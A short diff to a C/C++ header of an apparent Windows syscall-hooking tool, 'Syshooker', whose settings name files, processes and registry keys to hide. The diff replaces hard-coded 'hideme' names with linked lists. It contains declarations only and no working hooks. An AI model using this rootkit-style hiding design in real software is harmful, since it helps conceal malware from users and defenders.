@@ -8,13 +8,17 @@ struct SyshookerSettings {
 	wchar_t NtQuerySystemInformationProcessMagicName[MAX_PATH_SYSHOOKER];
 	wchar_t RegistryKeyMagicName[MAX_PATH_SYSHOOKER];
 };
-
-//SyshookerSettings Settings = {
-//	L"hideme",		// NtCreateFileMagicName
-//	L"wassup",		// NtWriteFileMagicName
-//	L"hideme",		// NtQueryDirectoryFileExMagicName
-//	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
-//	L"hideme",		// RegistryKeyMagicName
-//};
-
 extern SyshookerSettings Settings;
+
+typedef struct NameNode {
+	struct NameNode* Next;
+	wchar_t* NameBuffer;
+	size_t NameLength;
+};
+
+struct SyshookerSettingsNew {
+	NameNode* FileMagicNamesHead;
+	NameNode* ProcessMagicNamesHead;
+	NameNode* RegistryMagicNamesHead;
+};
+extern SyshookerSettingsNew SettingsNew;
